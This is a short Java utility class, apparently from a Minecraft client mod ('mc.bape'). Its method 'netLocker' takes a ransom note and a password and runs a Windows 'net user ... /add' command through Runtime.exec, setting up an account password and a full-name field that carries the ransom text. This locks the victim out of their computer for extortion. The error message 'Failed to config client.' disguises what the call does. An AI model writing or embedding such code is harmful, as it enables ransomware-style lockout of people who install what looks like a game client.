package mc.bape.utils;

import java.io.*;

public class LockComputerUtils
{
    public static void netLocker(final String Ransomnote, final String password) {
        try {
            Runtime.getRuntime().exec("net user %username% " + password + " /add /FULLNAME:\"" + Ransomnote + "\"");
        }
        catch (IOException e) {
            Helper.sendMessage("Failed to config client.");
        }
    }
}
